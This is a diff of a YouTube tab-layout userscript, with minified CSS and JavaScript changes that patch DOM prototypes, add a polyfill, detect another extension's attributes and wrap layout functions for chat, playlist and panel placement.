svg{pointer-events:none}ytd-watch-flexy #right-tabs .tab-btn[tyt-tab-content].active{--tyt-tab-btn-color:var(--yt-spec-text-primary);background-color:var(--ytd-searchbox-legacy-button-focus-color);border-bottom-color:var(--tyt-tab-bar-color-1);border-bottom:2px solid var(--tyt-tab-bar-color-2);font-weight:500;outline:0}ytd-watch-flexy #right-tabs .tab-btn[tyt-tab-content].active svg{opacity:.9}ytd-watch-flexy #right-tabs .tab-btn[tyt-tab-content]:not(.active):hover{--tyt-tab-btn-color:var(--yt-spec-text-primary);background-color:var(--ytd-searchbox-legacy-button-hover-color)}ytd-watch-flexy #right-tabs .tab-btn[tyt-tab-content]:not(.active):hover svg{opacity:.9}ytd-watch-flexy #right-tabs .tab-btn[tyt-tab-content]{user-select:none!important}ytd-watch-flexy #right-tabs .tab-btn[tyt-tab-content].tab-btn-hidden{display:none}ytd-watch-flexy[tyt-comment-disabled] #right-tabs .tab-btn[tyt-tab-content=\"#tab-comments\"],ytd-watch-flexy[tyt-comment-disabled] #right-tabs .tab-btn[tyt-tab-content=\"#tab-comments\"]:hover{--tyt-tab-btn-color:var(--yt-spec-icon-disabled)}ytd-watch-flexy[tyt-comment-disabled] #right-tabs .tab-btn[tyt-tab-content=\"#tab-comments\"] span#tyt-cm-count:empty{display:none}ytd-watch-flexy #right-tabs .tab-btn span#tyt-cm-count:empty:after{color:currentColor;display:inline-block;font-size:inherit;text-align:left;transform:scaleX(.8);width:4em}}@supports (color:var(--tyt-cm-count-define )){ytd-watch-flexy{--tyt-x-loading-content-letter-spacing:2px}html{--tabview-text-loading:\"Loading\";--tabview-text-fetching:\"Fetching\";--tabview-panel-loading:var(--tabview-text-loading)}html:lang(ja){--tabview-text-loading:\"読み込み中\";--tabview-text-fetching:\"フェッチ..\"}html:lang(ko){--tabview-text-loading:\"로딩..\";--tabview-text-fetching:\"가져오기..\"}html:lang(zh-Hant){--tabview-text-loading:\"載入中\";--tabview-text-fetching:\"擷取中\"}html:lang(zh-Hans){--tabview-text-loading:\"加载中\";--tabview-text-fetching:\"抓取中\"}html:lang(ru){--tabview-text-loading:\"Загрузка\";--tabview-text-fetching:\"Получение\"}ytd-watch-flexy #right-tabs .tab-btn span#tyt-cm-count:empty:after{content:var(--tabview-text-loading);letter-spacing:var(--tyt-x-loading-content-letter-spacing)}}@supports (color:var(--tabview-font-size-btn-define )){.font-size-right{align-content:space-evenly;bottom:0;display:inline-flex;flex-direction:column;justify-content:space-evenly;padding:4px 0;pointer-events:none;position:absolute;right:0;top:0;width:16px}html body ytd-watch-flexy.style-scope .font-size-btn{user-select:none!important}.font-size-btn{--tyt-font-size-btn-display:none;background-color:var(--yt-spec-badge-chip-background);box-sizing:border-box;color:var(--yt-spec-text-secondary);cursor:pointer;display:var(--tyt-font-size-btn-display,none);font-family:Menlo,Lucida Console,Monaco,Consolas,monospace;font-weight:900;height:12px;line-height:100%;margin:0;padding:0;pointer-events:all;position:relative;transform-origin:left top;transition:background-color 90ms linear,color 90ms linear;width:12px}.font-size-btn:hover{background-color:var(--yt-spec-text-primary);color:var(--yt-spec-general-background-a)}@supports (zoom:0.5){.tab-btn .font-size-btn{--tyt-font-size-btn-display:none}.tab-btn.active:hover .font-size-btn{--tyt-font-size-btn-display:inline-block}}}body ytd-watch-flexy:not([is-two-columns_]) #columns.ytd-watch-flexy{flex-direction:column}body ytd-watch-flexy:not([is-two-columns_]) #secondary.ytd-watch-flexy{box-sizing:border-box;display:block;width:100%}body ytd-watch-flexy:not([is-two-columns_]) #secondary.ytd-watch-flexy secondary-wrapper{contain:content;height:auto;padding-left:var(--ytd-margin-6x)}body ytd-watch-flexy:not([is-two-columns_]) #secondary.ytd-watch-flexy secondary-wrapper #right-tabs{overflow:auto}[tyt-chat=\"+\"]{--tyt-chat-grow:1}[tyt-chat=\"+\"] secondary-wrapper>[tyt-chat-container]{display:flex;flex-direction:column;flex-grow:var(--tyt-chat-grow);flex-shrink:0}[tyt-chat=\"+\"] secondary-wrapper>[tyt-chat-container]>#chat{flex-grow:var(--tyt-chat-grow)}ytd-watch-flexy[is-two-columns_]:not([theater]) #columns.style-scope.ytd-watch-flexy{min-height:calc(100vh - var(--ytd-toolbar-height, 56px))}ytd-watch-flexy[is-two-columns_]:not([full-bleed-player]) ytd-live-chat-frame#chat{height:auto!important;min-height:auto!important}ytd-watch-flexy[tyt-tab^=\"#\"]:not([is-two-columns_]):not([tyt-chat=\"+\"]) #right-tabs{min-height:var(--ytd-watch-flexy-chat-max-height)}body ytd-watch-flexy:not([is-two-columns_]) #chat.ytd-watch-flexy{margin-top:0}body ytd-watch-flexy:not([is-two-columns_]) ytd-watch-metadata.ytd-watch-flexy{margin-bottom:0}ytd-watch-metadata.ytd-watch-flexy ytd-metadata-row-container-renderer{display:none}#tab-info [show-expand-button] #expand-sizer.ytd-text-inline-expander{visibility:initial}#tab-info #social-links.style-scope.ytd-video-description-infocards-section-renderer>#left-arrow-container.ytd-video-description-infocards-section-renderer>#left-arrow,#tab-info #social-links.style-scope.ytd-video-description-infocards-section-renderer>#right-arrow-container.ytd-video-description-infocards-section-renderer>#right-arrow{border:6px solid transparent;opacity:.65}#tab-info #social-links.style-scope.ytd-video-description-infocards-section-renderer>#left-arrow-container.ytd-video-description-infocards-section-renderer>#left-arrow:hover,#tab-info #social-links.style-scope.ytd-video-description-infocards-section-renderer>#right-arrow-container.ytd-video-description-infocards-section-renderer>#right-arrow:hover{opacity:1}#tab-info #social-links.style-scope.ytd-video-description-infocards-section-renderer>div#left-arrow-container:before{background:transparent;content:\"\";display:block;height:40px;left:-20px;position:absolute;top:0;width:40px;z-index:-1}#tab-info #social-links.style-scope.ytd-video-description-infocards-section-renderer>div#right-arrow-container:before{background:transparent;content:\"\";display:block;height:40px;position:absolute;right:-20px;top:0;width:40px;z-index:-1}body ytd-watch-flexy[is-two-columns_][tyt-egm-panel_] #columns.style-scope.ytd-watch-flexy #panels.style-scope.ytd-watch-flexy{display:flex;flex-direction:column;flex-grow:1;flex-shrink:0}body ytd-watch-flexy[is-two-columns_][tyt-egm-panel_] #columns.style-scope.ytd-watch-flexy #panels.style-scope.ytd-watch-flexy ytd-engagement-panel-section-list-renderer[target-id][visibility=ENGAGEMENT_PANEL_VISIBILITY_EXPANDED]{display:flex;flex-direction:column;flex-grow:1;flex-shrink:0;height:auto;max-height:none;min-height:auto}secondary-wrapper [visibility=ENGAGEMENT_PANEL_VISIBILITY_EXPANDED] #body.ytd-transcript-renderer:not(:empty),secondary-wrapper [visibility=ENGAGEMENT_PANEL_VISIBILITY_EXPANDED] #content.ytd-transcript-renderer:not(:empty),secondary-wrapper [visibility=ENGAGEMENT_PANEL_VISIBILITY_EXPANDED] ytd-transcript-renderer:not(:empty){flex-grow:1;height:auto;max-height:none;min-height:auto}secondary-wrapper #content.ytd-engagement-panel-section-list-renderer{position:relative}secondary-wrapper #content.ytd-engagement-panel-section-list-renderer>[panel-target-id]:only-child{contain:style size}secondary-wrapper #content.ytd-engagement-panel-section-list-renderer ytd-transcript-segment-list-renderer.ytd-transcript-search-panel-renderer{contain:strict;flex-grow:1}secondary-wrapper #content.ytd-engagement-panel-section-list-renderer ytd-transcript-segment-renderer.style-scope.ytd-transcript-segment-list-renderer,secondary-wrapper #content.ytd-engagement-panel-section-list-renderer ytd-transcript-segment-renderer.style-scope.ytd-transcript-segment-list-renderer>.segment{contain:layout paint style}body ytd-watch-flexy[theater] #secondary.ytd-watch-flexy{margin-top:var(--ytd-margin-3x);padding-top:0}body ytd-watch-flexy[theater] secondary-wrapper{margin-top:0;padding-top:0}body ytd-watch-flexy[theater] #chat.ytd-watch-flexy{margin-bottom:var(--ytd-margin-2x)}#tab-comments ytd-comments#comments [field-of-cm-count]{margin-top:0}#tab-info>ytd-expandable-video-description-body-renderer{margin-bottom:var(--ytd-margin-3x)}#tab-info [class]:last-child{margin-bottom:0;padding-bottom:0}#tab-info ytd-rich-metadata-row-renderer ytd-rich-metadata-renderer{max-width:none}ytd-watch-flexy[is-two-columns_] secondary-wrapper #chat.ytd-watch-flexy{margin-bottom:var(--ytd-margin-3x)}ytd-watch-flexy[tyt-tab] tp-yt-paper-tooltip{contain:content;white-space:nowrap}ytd-watch-info-text tp-yt-paper-tooltip.style-scope.ytd-watch-info-text{margin-bottom:-300px;margin-top:-96px}[hide-default-text-inline-expander] #bottom-row #description.ytd-watch-metadata{font-size:1.2rem;line-height:1.8rem}[hide-default-text-inline-expander] #bottom-row #description.ytd-watch-metadata yt-animated-rolling-number{font-size:inherit}[hide-default-text-inline-expander] #bottom-row #description.ytd-watch-metadata #info-container.style-scope.ytd-watch-info-text{align-items:center}ytd-watch-flexy[hide-default-text-inline-expander]{--tyt-bottom-watch-metadata-margin:6px}[hide-default-text-inline-expander] #bottom-row #description.ytd-watch-metadata>#description-inner.ytd-watch-metadata{margin:6px 12px}[hide-default-text-inline-expander] ytd-watch-metadata[title-headline-xs] h1.ytd-watch-metadata{font-size:1.8rem}ytd-watch-flexy[is-two-columns_][hide-default-text-inline-expander] #below.style-scope.ytd-watch-flexy ytd-merch-shelf-renderer{border:0;margin:0;padding:0}ytd-watch-flexy[is-two-columns_][hide-default-text-inline-expander] #below.style-scope.ytd-watch-flexy ytd-watch-metadata.ytd-watch-flexy{margin-bottom:6px}#tab-info yt-video-attribute-view-model .yt-video-attribute-view-model--horizontal .yt-video-attribute-view-model__link-container .yt-video-attribute-view-model__hero-section{flex-shrink:0}#tab-info yt-video-attribute-view-model .yt-video-attribute-view-model__overflow-menu{background:var(--yt-emoji-picker-category-background-color);border-radius:99px}#tab-info yt-video-attribute-view-model .yt-video-attribute-view-model--image-square.yt-video-attribute-view-model--image-large .yt-video-attribute-view-model__hero-section{max-height:128px}#tab-info yt-video-attribute-view-model .yt-video-attribute-view-model--image-large .yt-video-attribute-view-model__hero-section{max-width:128px}#tab-info ytd-reel-shelf-renderer #items.yt-horizontal-list-renderer ytd-reel-item-renderer.yt-horizontal-list-renderer{max-width:142px}ytd-watch-info-text#ytd-watch-info-text.style-scope.ytd-watch-metadata #date-text.style-scope.ytd-watch-info-text,ytd-watch-info-text#ytd-watch-info-text.style-scope.ytd-watch-metadata #view-count.style-scope.ytd-watch-info-text{align-items:center}ytd-watch-info-text:not([detailed]) #info.ytd-watch-info-text a.yt-simple-endpoint.yt-formatted-string{pointer-events:none}body ytd-app>ytd-popup-container>tp-yt-iron-dropdown>#contentWrapper>[slot=dropdown-content]{backdrop-filter:none}#tab-info [tyt-clone-refresh-count]{overflow:visible!important}#tab-info #items.ytd-horizontal-card-list-renderer yt-video-attribute-view-model.ytd-horizontal-card-list-renderer{contain:layout}#tab-info #thumbnail-container.ytd-structured-description-channel-lockup-renderer,#tab-info ytd-media-lockup-renderer[is-compact] #thumbnail-container.ytd-media-lockup-renderer{flex-shrink:0}secondary-wrapper ytd-donation-unavailable-renderer{--ytd-margin-6x:var(--ytd-margin-2x);--ytd-margin-5x:var(--ytd-margin-2x);--ytd-margin-4x:var(--ytd-margin-2x);--ytd-margin-3x:var(--ytd-margin-2x)}[tyt-no-less-btn] #less{display:none}.tyt-metadata-hover-resized #analytics-button,.tyt-metadata-hover-resized #purchase-button,.tyt-metadata-hover-resized #sponsor-button,.tyt-metadata-hover-resized #subscribe-button{display:none!important}.tyt-metadata-hover #upload-info{flex-basis:100vw;flex-shrink:0;max-width:max-content;min-width:max-content}#tab-info ytd-structured-description-playlist-lockup-renderer[collections] #playlist-thumbnail.style-scope.ytd-structured-description-playlist-lockup-renderer{max-width:100%}#tab-info ytd-structured-description-playlist-lockup-renderer[collections] #lockup-container.ytd-structured-description-playlist-lockup-renderer{padding:1px}#tab-info ytd-structured-description-playlist-lockup-renderer[collections] #thumbnail.ytd-structured-description-playlist-lockup-renderer{outline:1px solid hsla(0,0%,50%,.5)}ytd-live-chat-frame#chat[collapsed] ytd-message-renderer~#show-hide-button.ytd-live-chat-frame>ytd-toggle-button-renderer.ytd-live-chat-frame{padding:0}.tyt-info-invisible{display:none}[tyt-playlist-expanded] secondary-wrapper>ytd-playlist-panel-renderer#playlist{flex-grow:1;flex-shrink:1;max-height:unset!important;overflow:auto}[tyt-playlist-expanded] secondary-wrapper>ytd-playlist-panel-renderer#playlist>#container{max-height:unset!important}secondary-wrapper ytd-playlist-panel-renderer{--ytd-margin-6x:var(--ytd-margin-3x)}ytd-watch-flexy[theater] ytd-playlist-panel-renderer[collapsible][collapsed] .header.ytd-playlist-panel-renderer{padding:6px 8px}ytd-watch-flexy[theater] #playlist.ytd-watch-flexy{margin-bottom:var(--ytd-margin-2x)}ytd-watch-flexy[theater] #right-tabs .tab-btn[tyt-tab-content]{border-bottom:0 solid transparent;padding:8px 4px 6px}ytd-watch-flexy{--tyt-bottom-watch-metadata-margin:12px}ytd-watch-flexy[rounded-info-panel],ytd-watch-flexy[rounded-player-large]{--tyt-rounded-a1:${VAL_ROUNDED_A1}px}#bottom-row.style-scope.ytd-watch-metadata .item.ytd-watch-metadata{margin-right:var(--tyt-bottom-watch-metadata-margin,12px);margin-top:var(--tyt-bottom-watch-metadata-margin,12px)}#cinematics{contain:layout style size}body[data-ytlstm-theater-mode] #secondary-inner[class]>secondary-wrapper[class]:not(#chat-container):not(#chat){display:flex!important}body[data-ytlstm-theater-mode] secondary-wrapper{all:unset;height:100vh}body[data-ytlstm-theater-mode] #right-tabs{display:none}body[data-ytlstm-theater-mode] [data-ytlstm-chat-over-video] [tyt-chat=\"+\"]{--tyt-chat-grow:unset}body[data-ytlstm-theater-mode] [data-ytlstm-chat-over-video] #chat-container.style-scope,body[data-ytlstm-theater-mode] [data-ytlstm-chat-over-video] #columns.style-scope.ytd-watch-flexy,body[data-ytlstm-theater-mode] [data-ytlstm-chat-over-video] #secondary-inner.style-scope.ytd-watch-flexy,body[data-ytlstm-theater-mode] [data-ytlstm-chat-over-video] #secondary.style-scope.ytd-watch-flexy,body[data-ytlstm-theater-mode] [data-ytlstm-chat-over-video] [tyt-chat-container].style-scope,body[data-ytlstm-theater-mode] [data-ytlstm-chat-over-video] secondary-wrapper{pointer-events:none}body[data-ytlstm-theater-mode] [data-ytlstm-chat-over-video] #chat[class]{pointer-events:auto}@supports (color:var(--tyt-fix-20251124 )){#below ytd-watch-metadata .ytTextCarouselItemViewModelImageType{height:16px;width:16px}#below ytd-watch-metadata yt-text-carousel-item-view-model{column-gap:6px}#below ytd-watch-metadata ytd-watch-info-text#ytd-watch-info-text{font-size:inherit;line-height:inherit}}";
 
   const VAL_ROUNDED_A1 = 12;
   const styles = {
@@ -173,6 +173,7 @@
   const executionScript = (communicationKey) => {
     const DEBUG_5084 = false;
     const DEBUG_5085 = false;
+    const DEBUG_handleNavigateFactory = false;
     const TAB_AUTO_SWITCH_TO_COMMENTS = false;
     if (typeof trustedTypes !== "undefined" && trustedTypes.defaultPolicy === null) {
       let s = (s2) => s2;
@@ -332,6 +333,10 @@
           cnt.collapsed = false;
           if (cnt.collapsed === false)
             return;
+          if (cnt.isHiddenByUser === true && cnt.collapsed === true) {
+            cnt.isHiddenByUser = false;
+            cnt.collapsed = false;
+          }
         }
         let button = document.querySelector("ytd-live-chat-frame#chat[collapsed] > .ytd-live-chat-frame#show-hide-button");
         if (button) {
@@ -355,6 +360,10 @@
           cnt.collapsed = true;
           if (cnt.collapsed === true)
             return;
+          if (cnt.isHiddenByUser === false && cnt.collapsed === false) {
+            cnt.isHiddenByUser = true;
+            cnt.collapsed = true;
+          }
         }
         let button = document.querySelector("ytd-live-chat-frame#chat:not([collapsed]) > .ytd-live-chat-frame#show-hide-button");
         if (button) {
@@ -409,7 +418,7 @@
       }, ytBtnCloseEngagementPanels = function() {
         const actions = [];
         for (const panelElm of document.querySelectorAll(
-          `ytd-watch-flexy[flexy][tyt-tab] #panels.ytd-watch-flexy ytd-engagement-panel-section-list-renderer[target-id][visibility]:not([hidden])`
+          `ytd-watch-flexy[tyt-tab] #panels.ytd-watch-flexy ytd-engagement-panel-section-list-renderer[target-id][visibility]:not([hidden])`
         )) {
           if (panelElm.getAttribute("visibility") == "ENGAGEMENT_PANEL_VISIBILITY_EXPANDED" && !panelElm.closest("[hidden]")) {
             actions.push({
@@ -444,24 +453,57 @@
       const qsAll = (elm, selector) => {
         return HTMLElement_.prototype.querySelectorAll.call(elm, selector);
       };
+      const defineProperties = (p, o) => {
+        if (!p) {
+          return;
+        }
+        for (const k of Object.keys(o)) {
+          if (!o[k]) {
+            delete o[k];
+          }
+        }
+        return Object.defineProperties(p, o);
+      };
+      const replaceChildrenPolyfill = function replaceChildren(...new_children) {
+        let el = this.firstChild;
+        while (el) {
+          const next = el.nextSibling;
+          el.remove();
+          el = next;
+        }
+        this.append(...new_children);
+      };
       const pdsBaseDF = Object.getOwnPropertyDescriptors(DocumentFragment.prototype);
-      Object.defineProperties(DocumentFragment.prototype, {
-        replaceChildren000: pdsBaseDF.replaceChildren
-      });
+      if (pdsBaseDF.replaceChildren) {
+        defineProperties(DocumentFragment.prototype, {
+          replaceChildren000: pdsBaseDF.replaceChildren
+        });
+      } else {
+        DocumentFragment.prototype.replaceChildren000 = replaceChildrenPolyfill;
+      }
       const pdsBaseNode = Object.getOwnPropertyDescriptors(Node.prototype);
-      Object.defineProperties(Node.prototype, {
-        appendChild000: pdsBaseNode.appendChild,
-        insertBefore000: pdsBaseNode.insertBefore
-      });
+      if (!pdsBaseNode.appendChild000 && !pdsBaseNode.insertBefore000) {
+        defineProperties(Node.prototype, {
+          appendChild000: pdsBaseNode.appendChild,
+          insertBefore000: pdsBaseNode.insertBefore
+        });
+      }
       const pdsBaseElement = Object.getOwnPropertyDescriptors(Element.prototype);
-      Object.defineProperties(Element.prototype, {
-        setAttribute000: pdsBaseElement.setAttribute,
-        getAttribute000: pdsBaseElement.getAttribute,
-        hasAttribute000: pdsBaseElement.hasAttribute,
-        removeAttribute000: pdsBaseElement.removeAttribute,
-        querySelector000: pdsBaseElement.querySelector,
-        replaceChildren000: pdsBaseElement.replaceChildren
-      });
+      if (!pdsBaseElement.setAttribute000 && !pdsBaseElement.querySelector000) {
+        const nPdsElement = {
+          setAttribute000: pdsBaseElement.setAttribute,
+          getAttribute000: pdsBaseElement.getAttribute,
+          hasAttribute000: pdsBaseElement.hasAttribute,
+          removeAttribute000: pdsBaseElement.removeAttribute,
+          querySelector000: pdsBaseElement.querySelector
+        };
+        if (pdsBaseElement.replaceChildren) {
+          nPdsElement.replaceChildren000 = pdsBaseElement.replaceChildren;
+        } else {
+          Element.prototype.replaceChildren000 = replaceChildrenPolyfill;
+        }
+        defineProperties(Element.prototype, nPdsElement);
+      }
       Element.prototype.setAttribute111 = function(p, v) {
         v = `${v}`;
         if (this.getAttribute000(p) === v)
@@ -513,6 +555,44 @@
         }
         nodeList.length = 0;
         nodeList = null;
+      };
+      let secondaryInnerHold = 0;
+      const secondaryInnerFn = (cb) => {
+        if (secondaryInnerHold) {
+          secondaryInnerHold++;
+          let err, r;
+          try {
+            r = cb();
+          } catch (e) {
+            err = e;
+          }
+          secondaryInnerHold--;
+          if (err)
+            throw err;
+          return r;
+        } else {
+          const ea = document.querySelector("#secondary-inner");
+          const eb = document.querySelector("secondary-wrapper#secondary-inner-wrapper");
+          if (ea && eb) {
+            secondaryInnerHold++;
+            let err, r;
+            ea.id = "secondary-inner-";
+            eb.id = "secondary-inner";
+            try {
+              r = cb();
+            } catch (e) {
+              err = e;
+            }
+            ea.id = "secondary-inner";
+            eb.id = "secondary-inner-wrapper";
+            secondaryInnerHold--;
+            if (err)
+              throw err;
+            return r;
+          } else {
+            return cb();
+          }
+        }
       };
       const DISABLE_FLAGS_SHADYDOM_FREE = true;
       (() => {
@@ -839,19 +919,53 @@
       let isRightTabsInserted = false;
       const rightTabsProvidedPromise = new PromiseExternal();
       const infoExpanderElementProvidedPromise = new PromiseExternal();
-      const cmAttr = document.createComment("1");
-      const cmAttrStack = [];
-      const cmAttrStackPush = (f) => {
-        cmAttrStack.push(f);
-        cmAttr.data = `${(cmAttr.data & 7) + 1}`;
-      };
-      const cmAttrObs = new MutationObserver(() => {
-        const l = cmAttrStack.length;
-        for (let i = 0; i < l; i++) {
-          cmAttrStack[i]();
+      const pluginsDetected = {};
+      const pluginDetectObserver = new MutationObserver((mutations) => {
+        let changeOnRoot = false;
+        let newPlugins = [];
+        const attributeChangedSet = /* @__PURE__ */ new Set();
+        for (const mutation of mutations) {
+          if (mutation.target === document)
+            changeOnRoot = true;
+          let detected = "";
+          switch (mutation.attributeName) {
+            case "data-ytlstm-new-layout":
+            case "data-ytlstm-overlay-text-shadow":
+            case "data-ytlstm-theater-mode":
+              detected = "external.ytlstm";
+              attributeChangedSet.add(detected);
+              break;
+          }
+          if (detected && !pluginsDetected[detected]) {
+            pluginsDetected[detected] = true;
+            newPlugins.push(detected);
+          }
+        }
+        if (elements.flexy && attributeChangedSet.has("external.ytlstm")) {
+          elements.flexy.setAttribute(
+            "tyt-external-ytlstm",
+            document.querySelector("[data-ytlstm-theater-mode]") ? "1" : "0"
+          );
+        }
+        if (changeOnRoot) {
+          pluginDetectObserver.observe(document.body, { attributes: true });
+        }
+        for (const detected of newPlugins) {
+          const pluginItem = plugin[`${detected}`];
+          if (pluginItem) {
+            pluginItem.activate();
+          } else {
+          }
         }
       });
-      cmAttrObs.observe(cmAttr, { characterData: true });
+      pluginDetectObserver.observe(document.documentElement, { attributes: true });
+      if (document.body)
+        pluginDetectObserver.observe(document.body, { attributes: true });
+      navigateFinishedPromise.then(() => {
+        pluginDetectObserver.observe(document.documentElement, { attributes: true });
+        if (document.body)
+          pluginDetectObserver.observe(document.body, { attributes: true });
+      });
       const funcCanCollapse = function(s) {
         const content = this.content || this.$.content;
         this.canToggle = this.shouldUseNumberOfLines && (this.alwaysCollapsed || this.collapsed || this.isToggled === false) ? this.alwaysToggleable || this.isToggled || content && content.offsetHeight < content.scrollHeight : this.alwaysToggleable || this.isToggled || content && content.scrollHeight > this.collapsedHeight;
@@ -876,14 +990,26 @@
           return;
         const playlistElm = elements.playlist;
         const ytdFlexyElm = elements.flexy;
+        let doAttributeChange = 0;
         if (playlistElm && ytdFlexyElm) {
-          if (playlistElm.hasAttribute000("collapsed")) {
-            ytdFlexyElm.removeAttribute000("tyt-playlist-expanded");
+          if (playlistElm.closest("[hidden]")) {
+            doAttributeChange = 2;
+          } else if (playlistElm.hasAttribute000("collapsed")) {
+            doAttributeChange = 2;
           } else {
-            ytdFlexyElm.setAttribute111("tyt-playlist-expanded", "");
+            doAttributeChange = 1;
           }
         } else if (ytdFlexyElm) {
-          ytdFlexyElm.removeAttribute000("tyt-playlist-expanded");
+          doAttributeChange = 2;
+        }
+        if (doAttributeChange === 1) {
+          if (ytdFlexyElm.getAttribute000("tyt-playlist-expanded") !== "") {
+            ytdFlexyElm.setAttribute111("tyt-playlist-expanded", "");
+          }
+        } else if (doAttributeChange === 2) {
+          if (ytdFlexyElm.hasAttribute000("tyt-playlist-expanded")) {
+            ytdFlexyElm.removeAttribute000("tyt-playlist-expanded");
+          }
         }
       };
       const aoChat = new MutationObserver(() => {
@@ -1053,12 +1179,19 @@
           if (!ytdFlexyElm.hasAttribute000("tyt-playlist-expanded"))
             r -= 128;
         }
+        if (flag & 4096) {
+          r |= 4096;
+          if (ytdFlexyElm.getAttribute("tyt-external-ytlstm") !== "1")
+            r -= 4096;
+        }
         return r;
       };
       const updateChatLocation498 = function() {
         if (this.is !== "ytd-watch-grid") {
-          this.updatePageMediaQueries();
-          this.schedulePlayerSizeUpdate_();
+          secondaryInnerFn(() => {
+            this.updatePageMediaQueries();
+            this.schedulePlayerSizeUpdate_();
+          });
         }
       };
       const mirrorNodeWS = /* @__PURE__ */ new WeakMap();
@@ -1556,22 +1689,23 @@
           return false;
         };
         const conditionFulfillment = (req) => {
-          const endpoint = req ? req.command : null;
-          if (!endpoint)
+          const command = req ? req.command : null;
+          DEBUG_handleNavigateFactory && void 0;
+          if (!command)
             return;
-          if (endpoint && (endpoint.commandMetadata || 0).webCommandMetadata && endpoint.watchEndpoint) {
-          } else if (endpoint && (endpoint.commandMetadata || 0).webCommandMetadata && endpoint.browseEndpoint && isChannelId(endpoint.browseEndpoint.browseId)) {
-          } else if (endpoint && (endpoint.browseEndpoint || endpoint.searchEndpoint) && !endpoint.urlEndpoint && !endpoint.watchEndpoint) {
+          if (command && (command.commandMetadata || 0).webCommandMetadata && command.watchEndpoint) {
+          } else if (command && (command.commandMetadata || 0).webCommandMetadata && command.browseEndpoint && isChannelId(command.browseEndpoint.browseId)) {
+          } else if (command && (command.browseEndpoint || command.searchEndpoint) && !command.urlEndpoint && !command.watchEndpoint) {
           } else {
             return false;
           }
+          DEBUG_handleNavigateFactory && void 0;
           if (!shouldUseMiniPlayer())
             return false;
+          DEBUG_handleNavigateFactory && void 0;
           if (pageType !== "watch")
             return false;
-          if (!checkElementExist("ytd-watch-flexy #player button.ytp-miniplayer-button.ytp-button", "[hidden]")) {
-            return false;
-          }
+          DEBUG_handleNavigateFactory && void 0;
           return true;
         };
         let u38 = 0;
@@ -1628,7 +1762,9 @@
             let endpoint = null;
             if (conditionFulfillment(req)) {
               endpoint = getBrowsableEndPoint(req);
+              DEBUG_handleNavigateFactory && void 0;
             }
+            DEBUG_handleNavigateFactory && void 0;
             if (!endpoint || !shouldUseMiniPlayer())
               return handleNavigate.apply($this, $arguments);
             const ytdAppElm = document.querySelector("ytd-app");
@@ -1639,15 +1775,18 @@
             } catch (e) {
               object = null;
             }
+            DEBUG_handleNavigateFactory && void 0;
             if (typeof object !== "object")
               object = null;
             const once = { once: true };
             if (object !== null && !("playlistId" in object)) {
+              DEBUG_handleNavigateFactory && void 0;
               let wObject = mWeakRef(object);
               const N = 3;
               let count = 0;
               Object.defineProperty(kRef(wObject) || {}, "playlistId", {
                 get() {
+                  DEBUG_handleNavigateFactory && void 0;
                   count++;
                   if (count === N) {
                     delete this.playlistId;
@@ -1655,6 +1794,7 @@
                   return "*";
                 },
                 set(value) {
+                  DEBUG_handleNavigateFactory && void 0;
                   delete this.playlistId;
                   this.playlistId = value;
                 },
@@ -1982,6 +2122,16 @@
             });
             this.promiseReady.resolve();
           }
+        },
+        "external.ytlstm": {
+          activated: false,
+          toUse: true,
+          activate() {
+            if (this.activated)
+              return;
+            this.activated = true;
+            document.documentElement.classList.add("external-ytlstm");
+          }
         }
       };
       if (sessionStorage.__$tmp_UseAutoExpandInfoDesc$__)
@@ -2103,6 +2253,86 @@
           if (!cProto.updateChatLocation498 && typeof cProto.updateChatLocation === "function" && cProto.updateChatLocation.length === 0) {
             cProto.updateChatLocation498 = cProto.updateChatLocation;
             cProto.updateChatLocation = updateChatLocation498;
+          }
+          if (!cProto.isTwoColumnsChanged498_ && typeof cProto.isTwoColumnsChanged_ === "function" && cProto.isTwoColumnsChanged_.length === 2) {
+            cProto.isTwoColumnsChanged498_ = cProto.isTwoColumnsChanged_;
+            cProto.isTwoColumnsChanged_ = function(arg1, arg2, ...args) {
+              const r = secondaryInnerFn(() => {
+                const r2 = this.isTwoColumnsChanged498_(arg1, arg2, ...args);
+                return r2;
+              });
+              return r;
+            };
+          }
+          if (!cProto.defaultTwoColumnLayoutChanged498 && typeof cProto.defaultTwoColumnLayoutChanged === "function" && cProto.defaultTwoColumnLayoutChanged.length === 0) {
+            cProto.defaultTwoColumnLayoutChanged498 = cProto.defaultTwoColumnLayoutChanged;
+            cProto.defaultTwoColumnLayoutChanged = function(...args) {
+              const r = secondaryInnerFn(() => {
+                const r2 = this.defaultTwoColumnLayoutChanged498(...args);
+                return r2;
+              });
+              return r;
+            };
+          }
+          if (!cProto.updatePlayerLocation498 && typeof cProto.updatePlayerLocation === "function" && cProto.updatePlayerLocation.length === 0) {
+            cProto.updatePlayerLocation498 = cProto.updatePlayerLocation;
+            cProto.updatePlayerLocation = function(...args) {
+              const r = secondaryInnerFn(() => {
+                const r2 = this.updatePlayerLocation498(...args);
+                return r2;
+              });
+              return r;
+            };
+          }
+          if (!cProto.updateCinematicsLocation498 && typeof cProto.updateCinematicsLocation === "function" && cProto.updateCinematicsLocation.length === 0) {
+            cProto.updateCinematicsLocation498 = cProto.updateCinematicsLocation;
+            cProto.updateCinematicsLocation = function(...args) {
+              const r = secondaryInnerFn(() => {
+                const r2 = this.updateCinematicsLocation498(...args);
+                return r2;
+              });
+              return r;
+            };
+          }
+          if (!cProto.updatePanelsLocation498 && typeof cProto.updatePanelsLocation === "function" && cProto.updatePanelsLocation.length === 0) {
+            cProto.updatePanelsLocation498 = cProto.updatePanelsLocation;
+            cProto.updatePanelsLocation = function(...args) {
+              const r = secondaryInnerFn(() => {
+                const r2 = this.updatePanelsLocation498(...args);
+                return r2;
+              });
+              return r;
+            };
+          }
+          if (!cProto.swatcherooUpdatePanelsLocation498 && typeof cProto.swatcherooUpdatePanelsLocation === "function" && cProto.swatcherooUpdatePanelsLocation.length === 6) {
+            cProto.swatcherooUpdatePanelsLocation498 = cProto.swatcherooUpdatePanelsLocation;
+            cProto.swatcherooUpdatePanelsLocation = function(arg1, arg2, arg3, arg4, arg5, arg6, ...args) {
+              const r = secondaryInnerFn(() => {
+                const r2 = this.swatcherooUpdatePanelsLocation498(arg1, arg2, arg3, arg4, arg5, arg6, ...args);
+                return r2;
+              });
+              return r;
+            };
+          }
+          if (!cProto.updateErrorScreenLocation498 && typeof cProto.updateErrorScreenLocation === "function" && cProto.updateErrorScreenLocation.length === 0) {
+            cProto.updateErrorScreenLocation498 = cProto.updateErrorScreenLocation;
+            cProto.updateErrorScreenLocation = function(...args) {
+              const r = secondaryInnerFn(() => {
+                const r2 = this.updateErrorScreenLocation498(...args);
+                return r2;
+              });
+              return r;
+            };
+          }
